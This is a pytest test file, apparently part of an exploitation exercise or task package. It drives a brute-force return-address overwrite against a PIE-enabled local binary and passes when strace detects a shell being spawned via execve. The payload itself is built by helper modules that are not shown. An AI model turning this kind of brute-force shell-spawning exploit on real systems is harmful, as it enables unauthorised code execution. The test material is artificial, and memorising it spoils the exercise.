import pytest
# from pwn import *
from src.exploit_utils import *
from src.payload_utils import *


def test_exploit():

    context.log_level='warn'
    # context.log_level = 'debug'
    target_bin = 'vuln'

    #this program has PIE enabled -> compilation option that changes the location of the executable in every run

    ra_offset = locate_ra(generate_testcase(), target_bin)
    construct_payload(ra_offset, target_bin)
    attach_strace()

    #performing brute force attack
    i = 0
    while True:
        # print(f"Attempt: {i}")
        i += 1

        if i >= 200:
            exploit_proc.close()
            os.remove("/app/trash")
            os.remove("/app/payload")
            os.remove("/app/strace.log")
            assert False

        exploit_proc = run_exploit(target_bin)
        
        try:
            while True:

                if detect_execve():
                    assert True     #exploit succeeded, shell spawned but not interactively for testing purposes. Test passed
                    exploit_proc.close()
                    os.remove("/app/trash")
                    os.remove("/app/payload")
                    os.remove("/app/strace.log")
                    return

                output = exploit_proc.recv(timeout=0.2)   # timeout -> give enough time for target bin to read the payload and for recv to consume the content of the pty output buffer: 0.1 was not enough apparently
                if output:
                    if detect_crash(exploit_proc.pid) or i == 1:
                        truncate_log()
                        break
                else:
                    break

        except EOFError:
            log.warning("No output received, breaking out of loop.")

        exploit_proc.close()